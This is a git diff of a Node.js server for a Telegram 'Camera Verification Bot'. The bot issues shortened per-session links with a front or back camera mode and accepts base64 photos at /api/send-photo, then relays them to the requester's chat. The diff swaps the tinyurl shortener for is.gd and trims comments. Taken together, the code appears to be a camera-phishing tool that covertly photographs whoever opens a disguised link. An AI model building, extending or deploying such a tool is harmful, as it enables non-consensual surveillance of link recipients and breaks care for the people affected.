@@ -9,18 +9,16 @@ const PORT = process.env.PORT || 3000;
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const BASE_URL = process.env.BASE_URL;
 
-// CORS Enable (Netlify থেকে যাতে রিকোয়েস্ট আসতে পারে)
 app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 
 // Webhook এর জন্য polling false করা হলো
 const bot = new TelegramBot(BOT_TOKEN, { polling: false });
 
-// Memory Storage
-const activeSessions = {}; // sessionId -> chatId
-const userSettings = {};   // chatId -> { facingMode }
+const activeSessions = {};
+const userSettings = {};
 
-// --- Webhook Route (Telegram মেসেজ এখানে পাঠাবে) ---
+// --- Webhook Route ---
 app.post(`/bot${BOT_TOKEN}`, (req, res) => {
   bot.processUpdate(req.body);
   res.sendStatus(200);
@@ -40,12 +38,7 @@ bot.onText(/\/start/, (msg) => {
     }
   };
 
-  const statusMsg = `
-🟢 *Server is Live!*
-
-Welcome to the Camera Verification Bot.
-Select camera mode and click Generate Link.
-  `;
+  const statusMsg = `🟢 *Server is Live!*\n\nWelcome to the Camera Verification Bot.\nSelect camera mode and click Generate Link.`;
   bot.sendMessage(chatId, statusMsg, { parse_mode: 'Markdown', ...opts });
 });
 
@@ -86,8 +79,13 @@ bot.on('callback_query', async (query) => {
     const longLink = `${BASE_URL}/?s=${sessionId}&f=${facing}`;
     
     try {
-      const response = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longLink)}`);
+      // is.gd API ব্যবহার
+      const response = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(longLink)}`);
       const shortLink = await response.text();
+
+      if (!shortLink.startsWith('https://is.gd/')) {
+        throw new Error("Shortener failed");
+      }
 
       bot.sendMessage(chatId, `Here is your verification link:\n\n🔗 [Click here to open](${shortLink})\n\n*Camera:* ${facing === 'user' ? 'Front' : 'Back'}\n*Data will be sent only to this chat.*`, { parse_mode: 'Markdown' });
     } catch (err) {
@@ -98,19 +96,14 @@ bot.on('callback_query', async (query) => {
   }
 });
 
-// --- API Endpoint to receive photos from Frontend ---
+// --- API Endpoint to receive photos ---
 app.post('/api/send-photo', async (req, res) => {
   try {
     const { imageData, sessionId } = req.body;
 
     const chatId = activeSessions[sessionId];
-    if (!chatId) {
-      return res.status(403).json({ error: "Invalid or expired session." });
-    }
-
-    if (!imageData) {
-      return res.status(400).json({ error: "Missing image data" });
-    }
+    if (!chatId) return res.status(403).json({ error: "Invalid or expired session." });
+    if (!imageData) return res.status(400).json({ error: "Missing image data" });
 
     const base64Data = imageData.split(',')[1];
     const buffer = Buffer.from(base64Data, 'base64');
@@ -128,11 +121,9 @@ app.post('/api/send-photo', async (req, res) => {
 app.listen(PORT, async () => {
   console.log(`Server running on port ${PORT}`);
   
-  // Suga স্বয়ংক্রিয়ভাবে SUGA_PUBLIC_HOSTNAME তৈরি করে
   const sugaPublicHostname = process.env.SUGA_PUBLIC_HOSTNAME;
 
   if (sugaPublicHostname) {
-    // Suga-র হোস্টনেম থেকে সম্পূর্ণ URL তৈরি করা
     const publicUrl = sugaPublicHostname.startsWith('http') 
       ? sugaPublicHostname 
       : `https://${sugaPublicHostname}`;
